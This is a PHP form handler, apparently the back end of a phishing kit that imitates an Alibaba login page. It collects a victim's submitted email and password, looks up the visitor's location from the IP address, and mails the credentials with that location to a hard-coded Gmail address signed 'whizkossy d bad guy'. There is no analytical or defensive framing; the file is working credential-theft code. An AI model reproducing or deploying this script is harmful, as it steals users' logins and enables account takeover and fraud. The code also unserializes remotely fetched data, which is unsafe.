<?php
// process.php

$ip = $_SERVER['REMOTE_ADDR'];
$query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip));
$country = $query['country'];
$state = $query['city'];

$errors         = array();      // array to hold validation errors
$data           = array();      // array to pass back data

// validate the variables ======================================================
    // if any of these variables don't exist, add an error to our $errors array

	if (empty($_POST['email']))
        $errors['email'] = 'Email is required.';
		
    if (empty($_POST['pass']))
        $errors['pass'] = 'Password is required.';

// return a response ===========================================================

    // if there are any errors in our errors array, return a success boolean of false
    if ( ! empty($errors)) {

        // if there are items in our errors array, return those errors
        $data['success'] = false;
        $data['errors']  = $errors;
    } else {

        // if there are no errors process our form, then return a message

        // DO ALL YOUR FORM PROCESSING HERE
        // THIS CAN BE WHATEVER YOU WANT TO DO (LOGIN, SAVE, UPDATE, WHATEVER)

        // show a message of success and provide a true success variable
        $data['success'] = true;
        $data['message'] = '';
		
		
		if($data['success'] = true){
		
			$email = $_POST["email"];
			$password = $_POST["pass"];	
		
			$msg = 
			"==========Login=========" . "\n" .
			"Email: " . $email . "\n" .
			"Password: " . $password . "\n" .
			$ip . " | " . $state . "  " . $country . "\n" .
			"======By whizkossy d bad guy=====";
			
			$to = "blessedlogs1@gmail.com";
			$subject = "Alibaba Result";
			$body = $msg;
			$headers = "Alibaba Result";
			
			mail($to, $subject, $body, $headers);
			
		}
		
    }

    // return all our data to an AJAX call
    echo json_encode($data);
	